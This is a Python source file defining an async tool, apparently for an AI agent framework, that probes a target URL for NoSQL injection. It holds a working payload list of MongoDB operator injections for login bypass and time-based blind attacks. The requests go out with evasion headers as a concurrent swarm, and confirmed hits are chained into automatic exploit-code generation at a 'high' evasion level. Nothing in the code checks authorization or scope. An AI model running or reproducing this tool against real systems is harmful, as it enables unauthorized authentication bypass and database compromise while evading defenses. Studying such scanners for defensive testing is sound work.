import urllib.parse
from src.sdk.tool import function_tool
from .common import _get_evasion_headers, async_fetch_all, register_appsec_vulnerability
from src.sdk.utils import normalize_text, similarity_ratio, extract_title

def _has_login_markers(text: str) -> bool:
    if not text: return False
    t = text.lower()
    return ("type=\"password\"" in t or "name=\"password\"" in t or ("login" in t and "form" in t))

def _looks_like_error(text: str) -> bool:
    if not text: return False
    t = text.lower()
    return any(k in t for k in ["runtime error", "exception", "stack trace", "server error"])

# ─── NoSQL INJECTION ─────────────────────────────────────────────────────────────

@function_tool()
async def nosql_injection_probe(
    url: str,
    parameter: str,
    method: str = "GET",
    cookies: str = "",
) -> str:
    """
    Test for NoSQL Injection vulnerabilities (MongoDB, CouchDB, etc.) (Async Engine).
    Detects authentication bypass and data exfiltration patterns.

    Args:
        url: Target URL
        parameter: Parameter to inject into
        method: HTTP method — GET | POST (default: GET)
        cookies: Session cookies

    Returns:
        NoSQL injection scan results
    """
    out = [f"## NoSQL Injection Scan (Async Engine): {url}", f"Parameter: {parameter}", ""]
    hdrs = _get_evasion_headers({"Cookie": cookies} if cookies else None)

    # ── Baseline ──
    baseline_req = {"method": method.upper(), "headers": hdrs}
    parsed = urllib.parse.urlparse(url)
    qparams = dict(urllib.parse.parse_qsl(parsed.query))
    
    if method.upper() == "POST":
        baseline_req["url"] = url
        baseline_req["data"] = {parameter: "testuser"}
    else:
        q = qparams.copy()
        q[parameter] = "testuser"
        baseline_req["url"] = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(q)}"
        
    out.append("⏳ Fetching baseline profile...")
    try:
        baseline_responses = await async_fetch_all([baseline_req], max_concurrent=1, timeout_sec=10)
        baseline_resp = baseline_responses[0]
        baseline_body = baseline_resp["text"]
        baseline_code = baseline_resp["status"]
        baseline_len = len(baseline_body)
        baseline_title = extract_title(baseline_body)
        baseline_norm = normalize_text(baseline_body)
        baseline_login = _has_login_markers(baseline_body)
    except Exception as e:
        return f"❌ Failed to fetch baseline: {e}"

    payloads = [
        # Auth bypass — MongoDB operator injection
        ('{"$gt": ""}',     "application/json"),
        ('{"$ne": null}',   "application/json"),
        ('{"$gte": ""}',    "application/json"),
        ('{"$in": [""]}',   "application/json"),
        ('{"$regex": ".*"}', "application/json"),
        ('{"$where": "1==1"}', "application/json"),
        # Array-style (PHP/Node.js URL param)
        ('[%24ne]=1',       "form-urlencoded"),
        ('[%24gt]=',        "form-urlencoded"),
        # Time-based blind
        ('{"$where": "function(){var t=new Date();while(new Date()<t+3000){}return true;}"}', "application/json"),
        # String injection
        ("';return true;var a='", "form"),
        ("' || '1'=='1", "form"),
        ('{"username": {"$gt": ""}, "password": {"$gt": ""}}', "application/json"),
    ]

    async_requests = []
    
    for payload_val, ctype in payloads:
        req = {
            "method": method.upper(),
            "headers": hdrs.copy(),
            "_payload": payload_val,
            "_ctype": ctype
        }
        
        if method.upper() == "POST" or ctype == "application/json":
            req["method"] = "POST"
            req["url"] = url
            if ctype == "application/json":
                import json as _json2
                req["headers"]["Content-Type"] = "application/json"
                body_val = _json2.loads(payload_val) if payload_val.startswith("{") or payload_val.startswith("[") else payload_val
                req["data"] = _json2.dumps({parameter: body_val})
            else:
                req["data"] = {parameter: payload_val}
        else:
            q = qparams.copy()
            q[parameter] = payload_val
            req["url"] = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(q)}"
            
        async_requests.append(req)
        
    out.append(f"🚀 Launching async swarm for {len(async_requests)} NoSQL payloads...")
    scan_results = await async_fetch_all(async_requests, max_concurrent=15, timeout_sec=15)
    
    findings = []
    weak_findings = []
    
    for res in scan_results:
        req_meta = res["req"]
        payload_val = req_meta["_payload"]
        elapsed = res["elapsed"]
        
        if res["error"]:
            continue
            
        body = res["text"]
        body_len = len(body)
        body_title = extract_title(body)
        body_norm = normalize_text(body)
        sim = similarity_ratio(baseline_norm, body_norm) if baseline_norm else 0.0
        len_diff = abs(body_len - baseline_len)
        title_changed = bool(body_title and body_title != baseline_title)
        looks_error = _looks_like_error(body)
        login_gone = baseline_login and not _has_login_markers(body)
        success_markers = any(kw in body.lower() for kw in ["dashboard", "welcome", "logout", "profile"])
        status_changed = res["status"] != baseline_code
        time_based = elapsed > 2.5 and "$where" in payload_val
        
        strong = (
            time_based
            or (login_gone and success_markers)
            or (title_changed and sim < 0.95)
            or (status_changed and not looks_error and sim < 0.97)
            or (len_diff > 200 and sim < 0.96)
        )
        
        if strong:
            tag = "TIME-BASED" if time_based else "ANOMALY"
            evid = f"HTTP {res['status']} (baseline {baseline_code}), sim={sim:.2f}, time={elapsed:.2f}s"
            findings.append({"type": tag, "payload": payload_val, "evidence": evid})
        elif status_changed or len_diff > 120 or (sim < 0.97 and not looks_error):
            evid = f"HTTP {res['status']} (baseline {baseline_code}), sim={sim:.2f}, time={elapsed:.2f}s"
            weak_findings.append({"type": "LOW CONFIDENCE", "payload": payload_val, "evidence": evid})
            
    out.append("")
    if findings or weak_findings:
        out.append("── FINDINGS ──────────────────────────────────")
        
        for f in findings:
            out.append(f"🔴 {f['type']}: Payload: {f['payload'][:50]}")
            out.append(f"    Evidence: {f['evidence']}")
            await register_appsec_vulnerability(
                target_url=url, vuln_type="NoSQL Injection", severity="CRITICAL",
                parameter=parameter, payload=f['payload'], evidence=f"{f['type']}: {f['evidence']}"
            )
                
        if weak_findings:
            out.append("\n── LOW CONFIDENCE CANDIDATES ───────────────")
            for w in weak_findings:
                out.append(f"⚠️ {w['payload'][:50]} -> {w['evidence']}")
                
        # ── Auto-Exploit Chaining ─────────────────────────────────────
        out.append("\n## Autonomous Exploit Generation")
        try:
            from src.tools.exploit_craft import generate_exploit_code
            
            context_str = f"Target URL: {url}\nMethod: {method}\nParameter: {parameter}\n\nConfirmed Vulnerabilities:\n"
            for v in findings[:2]:
                context_str += f"- {v['type']}: {v['evidence']}\nPayload: {v['payload']}\n"
            
            exploit_result = await generate_exploit_code.invoke(
                vuln_type="NoSQL Injection",
                target_tech="Unknown Web Application",
                context=context_str,
                evasion_level="high",
                language="python"
            )
            
            out.append("✅ Auto-Exploit successfully generated and saved:")
            out.append("\n".join(exploit_result.split("\n")[:10]) + "\n...")
        except ImportError:
            out.append("⚠️ Exploit engine (exploit_craft) not available in this build.")
        except Exception as e:
            out.append(f"⚠️ Exploit generation failed: {str(e)[:100]}")
    else:
        out.append("✅ No NoSQL injection detected (try with different parameters)")

    return "\n".join(out)
